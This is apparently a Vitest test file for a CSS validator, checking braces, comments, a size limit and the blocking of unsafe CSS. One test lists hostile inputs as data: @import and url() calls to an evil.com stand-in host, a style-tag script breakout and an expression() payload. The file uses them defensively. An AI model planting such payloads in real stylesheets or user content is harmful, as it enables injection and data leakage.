import { describe, it, expect } from 'vitest';
import { validateCSS } from './cssValidator';

describe('cssValidator', () => {
  it('returns valid for empty or whitespace CSS', () => {
    expect(validateCSS('')).toEqual({ isValid: true });
    expect(validateCSS('   \n  ')).toEqual({ isValid: true });
  });

  it('returns valid for well-formed CSS rules', () => {
    const validCSS = `
      .glass-panel {
        background: rgba(0, 0, 0, 0.5);
        border-radius: 12px;
      }
      :root {
        --primary: #00f0ff;
      }
    `;
    expect(validateCSS(validCSS)).toEqual({ isValid: true });
  });

  it('detects unexpected closing brace', () => {
    const invalidCSS = `
      .glass-panel {
        background: red;
      }}
    `;
    const res = validateCSS(invalidCSS);
    expect(res.isValid).toBe(false);
    expect(res.error).toContain('Unexpected closing brace');
  });

  it('detects missing closing brace', () => {
    const invalidCSS = `
      .glass-panel {
        background: red;
    `;
    const res = validateCSS(invalidCSS);
    expect(res.isValid).toBe(false);
    expect(res.error).toContain('Missing 1 closing brace');
  });

  it('detects unclosed comment', () => {
    const invalidCSS = `
      /* Unclosed comment
      .glass-panel { color: red; }
    `;
    const res = validateCSS(invalidCSS);
    expect(res.isValid).toBe(false);
    expect(res.error).toContain('Unclosed comment');
  });

  it('blocks dangerous external imports, URLs, and script expressions', () => {
    expect(validateCSS('@import url("https://evil.com/leak.css");').isValid).toBe(false);
    expect(validateCSS('@/*comment*/import "malicious.css";').isValid).toBe(false);
    expect(validateCSS('.card { background: url(https://evil.com/probe.png); }').isValid).toBe(false);
    expect(validateCSS('.card { background: url("data:image/svg+xml,<svg></svg>"); }').isValid).toBe(false);
    expect(validateCSS('</style><script>alert(1)</script>').isValid).toBe(false);
    expect(validateCSS('.card { width: expression(alert(1)); }').isValid).toBe(false);
    expect(validateCSS('@charset "UTF-8";').isValid).toBe(false);
  });

  it('allows safe comments mentioning forbidden keywords without false positives', () => {
    const safeWithComment = `
      /* @import is forbidden, use custom variables instead */
      .glass-panel {
        background: rgba(0, 0, 0, 0.5);
      }
    `;
    expect(validateCSS(safeWithComment)).toEqual({ isValid: true });
  });

  it('rejects oversized CSS exceeding the 64 KiB boundary', () => {
    const largeCSS = '.card { color: red; }\n'.repeat(3000); // > 64 KiB
    const res = validateCSS(largeCSS);
    expect(res.isValid).toBe(false);
    expect(res.error).toContain('64 KiB size limit');
  });
});
